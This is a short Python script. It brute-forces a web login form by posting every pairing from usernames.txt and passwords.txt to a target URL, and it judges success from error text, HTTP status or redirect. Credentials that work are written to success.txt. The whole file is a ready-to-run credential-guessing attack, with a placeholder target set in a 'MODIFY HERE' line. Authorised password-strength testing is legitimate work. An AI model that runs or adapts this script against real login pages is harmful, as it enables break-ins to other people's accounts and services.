import requests

##
#
# Basic Brute Force Password Utility
# brute(target, "username", "password", "incorrect", "https://www.test.com/")
#
# Arguments: URL of target form, Name of username field, Name of password field, Bad login text response, Bad login redirect
#
##

def make_request(url, username, password, username_field, password_field, error_msg, bad_redirect):

  data = {
    username_field: username,
    password_field: password
  }

  # Make post request
  r = requests.post(url, data=data)
  
  # What is part of the bad login response text? (ie: incorrect username or password)
  if error_msg in r.text.lower():
    print(f"{username}:{password} unsuccessful")
    return

  # Did we get a 400 error?
  if r.status_code == 401 or r.status_code == 403 or r.status_code == 400:
    print(f"{username}:{password} unsuccessful")
    return
  
  # Did we get redirected to the bad url?
  if r.url != bad_redirect:
    # It probably worked...
    log = username + ':' + password + '\n'
    print(f"(+) {username}:{password} worked!")
    with open('success.txt', 'a', encoding='utf-8') as success:
      success.write(log)
  else:
    print(f"{username}:{password} unsuccessful")


# Perform brute action
# url = the URL of the target using POST
def brute(url, username_field, password_field, error_msg, bad_redirect):
  # Usernames.txt is the local file to loop through
  with open('usernames.txt', 'r', encoding='utf-8') as usernames:
    for username in usernames:
      username = username.strip()
      with open('passwords.txt', 'r', encoding='utf-8') as passwords:
        for password in passwords:
          password = password.strip()
          make_request(url, username, password, username_field, password_field, error_msg, bad_redirect)


# MODIFY HERE
# Arguments: URL of target form, Name of username field, Name of password field, Bad login text response, Bad login redirect
brute("https://www.test.com/login/doLogin", "username", "password", "incorrect", "https://www.test.com/")